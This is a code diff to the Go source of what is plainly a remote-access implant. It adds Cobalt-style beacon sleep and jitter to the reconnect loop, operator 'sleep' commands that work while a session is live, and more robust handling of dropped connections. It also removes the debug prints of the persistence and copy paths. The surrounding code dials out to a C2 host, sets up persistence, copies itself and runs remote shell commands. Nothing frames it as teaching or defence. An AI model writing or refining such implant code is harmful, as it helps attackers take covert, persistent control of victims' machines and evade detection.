@@ -17,9 +17,11 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"io/fs"
+	"math/big"
 	"net"
 	"os"
 	"os/exec"
@@ -29,6 +31,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"syscall"
 	"time"
 )
@@ -360,6 +363,57 @@ var (
 	socksC2Mu   sync.Mutex
 	socksC2Conn net.Conn
 )
+
+// Cobalt-style sleep: reconnect / retry interval (seconds) + jitter percent.
+// Defaults: 5s sleep, 0% jitter. Updated live via "sleep <sec> [jitter%]" command.
+var (
+	beaconSleepSec  int64 = 5
+	beaconJitterPct int64 = 0
+)
+
+func setBeaconSleep(sec, jitter int64) {
+	if sec < 0 {
+		sec = 0
+	}
+	if sec > 86400 {
+		sec = 86400
+	}
+	if jitter < 0 {
+		jitter = 0
+	}
+	if jitter > 99 {
+		jitter = 99
+	}
+	atomic.StoreInt64(&beaconSleepSec, sec)
+	atomic.StoreInt64(&beaconJitterPct, jitter)
+}
+
+func getBeaconSleep() (sec, jitter int64) {
+	return atomic.LoadInt64(&beaconSleepSec), atomic.LoadInt64(&beaconJitterPct)
+}
+
+// getReconnectDelay returns sleep duration with optional Cobalt-style jitter
+// (uniform in [sleep*(1-jitter/100), sleep]).
+func getReconnectDelay() time.Duration {
+	sec, jitter := getBeaconSleep()
+	base := time.Duration(sec) * time.Second
+	if base <= 0 {
+		return 0
+	}
+	if jitter <= 0 {
+		return base
+	}
+	min := base * time.Duration(100-jitter) / 100
+	span := base - min
+	if span <= 0 {
+		return min
+	}
+	n, err := rand.Int(rand.Reader, big.NewInt(int64(span)+1))
+	if err != nil {
+		return base
+	}
+	return min + time.Duration(n.Int64())
+}
 
 func setSocksC2(c net.Conn) {
 	socksC2Mu.Lock()
@@ -934,10 +988,17 @@ func recvData(conn net.Conn) (string, error) {
 	for {
 		n, err := conn.Read(tempBuffer)
 		if err != nil {
-			if err == io.EOF {
+			// EOF / reset with no leftover must exit handleShell so we can reconnect
+			if err == io.EOF || errors.Is(err, net.ErrClosed) {
+				if buffer.Len() == 0 {
+					return "", err
+				}
 				break
 			}
 			return "", err
+		}
+		if n == 0 {
+			continue
 		}
 		buffer.Write(tempBuffer[:n])
 		data := buffer.String()
@@ -947,13 +1008,16 @@ func recvData(conn net.Conn) (string, error) {
 		}
 		if strings.Contains(data, "\n") {
 			lines := strings.Split(data, "\n")
-			if len(lines) > 0 {
+			if len(lines) > 0 && strings.TrimSpace(lines[0]) != "" {
 				return lines[0], nil
 			}
 		}
 		if buffer.Len() > 1024*1024 {
 			break
 		}
+	}
+	if buffer.Len() == 0 {
+		return "", io.EOF
 	}
 	return buffer.String(), nil
 }
@@ -2123,6 +2187,39 @@ func handleCmd(command string, conn net.Conn) {
 	command = strings.TrimSpace(command)
 	cmdLower := strings.ToLower(command)
 
+	// sleep / sleepinfo — Cobalt-style reconnect timing (works while session is live)
+	if cmdLower == "sleepinfo" || cmdLower == "sleep?" {
+		sec, jit := getBeaconSleep()
+		sendData(conn, Resp{Type: "response", Content: fmt.Sprintf("sleep=%ds jitter=%d%%", sec, jit)})
+		return
+	}
+	if cmdLower == "sleep" || strings.HasPrefix(cmdLower, "sleep ") {
+		parts := strings.Fields(command)
+		if len(parts) == 1 {
+			sec, jit := getBeaconSleep()
+			sendData(conn, Resp{Type: "response", Content: fmt.Sprintf("sleep=%ds jitter=%d%%\nUsage: sleep <seconds> [jitter%%]", sec, jit)})
+			return
+		}
+		sec, err := strconv.ParseInt(parts[1], 10, 64)
+		if err != nil || sec < 0 {
+			sendData(conn, Resp{Type: "response", Content: "Invalid sleep seconds (use 0-86400)"})
+			return
+		}
+		jit := int64(0)
+		if len(parts) >= 3 {
+			jit, err = strconv.ParseInt(parts[2], 10, 64)
+			if err != nil || jit < 0 || jit > 99 {
+				sendData(conn, Resp{Type: "response", Content: "Invalid jitter (use 0-99)"})
+				return
+			}
+		} else {
+			_, jit = getBeaconSleep() // keep existing jitter if only seconds given
+		}
+		setBeaconSleep(sec, jit)
+		sendData(conn, Resp{Type: "response", Content: fmt.Sprintf("OK sleep=%ds jitter=%d%% (applies on disconnect/reconnect)", sec, jit)})
+		return
+	}
+
 	// Persistence commands first (plain + case-insensitive) so they never fall through to shell
 	if cmdLower == "setpersistence" {
 		exePath, _ := os.Executable()
@@ -2445,6 +2542,27 @@ func handleCmd(command string, conn net.Conn) {
 			response := Resp{Type: "response", Content: result}
 			sendData(conn, response)
 		}
+	} else if strings.HasPrefix(cmdLower, "sleep") {
+		// Never fall through to shell (Windows has no sleep.exe → "Invalid command")
+		parts := strings.Fields(command)
+		if len(parts) >= 2 {
+			sec, err := strconv.ParseInt(parts[1], 10, 64)
+			if err == nil && sec >= 0 {
+				jit := int64(0)
+				if len(parts) >= 3 {
+					if j, e := strconv.ParseInt(parts[2], 10, 64); e == nil {
+						jit = j
+					}
+				} else {
+					_, jit = getBeaconSleep()
+				}
+				setBeaconSleep(sec, jit)
+				sendData(conn, Resp{Type: "response", Content: fmt.Sprintf("OK sleep=%ds jitter=%d%% (applies on disconnect/reconnect)", sec, jit)})
+				return
+			}
+		}
+		sec, jit := getBeaconSleep()
+		sendData(conn, Resp{Type: "response", Content: fmt.Sprintf("sleep=%ds jitter=%d%%\nUsage: sleep <seconds> [jitter%%]", sec, jit)})
 	} else {
 		result := runCommand(command)
 		response := Resp{Type: "response", Content: result}
@@ -2721,6 +2839,9 @@ func handleShell(conn net.Conn) {
 		if err != nil {
 			return
 		}
+		if strings.TrimSpace(command) == "" {
+			return
+		}
 
 		// SOCKS mux frames (must not go through normal command handler)
 		var sw socksWire
@@ -2784,7 +2905,6 @@ func runImplantMain(dllMode bool) {
 				}
 			}
 			exePath, _ := os.Executable()
-			fmt.Println(exePath)
 			go func() {
 				time.Sleep(5 * time.Second)
 				setPersistence(exePath)
@@ -2795,7 +2915,6 @@ func runImplantMain(dllMode bool) {
 			}
 			go func() {
 				copyPath := makeCopy()
-				fmt.Println(copyPath)
 				if copyPath != "" {
 					go func() {
 						time.Sleep(10 * time.Second)
@@ -2809,7 +2928,6 @@ func runImplantMain(dllMode bool) {
 	}
 
 	serverPort := getPort()
-	const reconnectDelay = 10 * time.Second
 
 	for {
 		serverHost := getHost()
@@ -2819,7 +2937,7 @@ func runImplantMain(dllMode bool) {
 		}
 		conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", serverHost, serverPort))
 		if err != nil {
-			time.Sleep(reconnectDelay)
+			time.Sleep(getReconnectDelay())
 			continue
 		}
 
@@ -2831,8 +2949,8 @@ func runImplantMain(dllMode bool) {
 		}
 
 		handleShell(conn)
-		conn.Close()
-		time.Sleep(reconnectDelay)
+		_ = conn.Close()
+		time.Sleep(getReconnectDelay())
 		_ = hashString("loop_junk")
 	}
 }
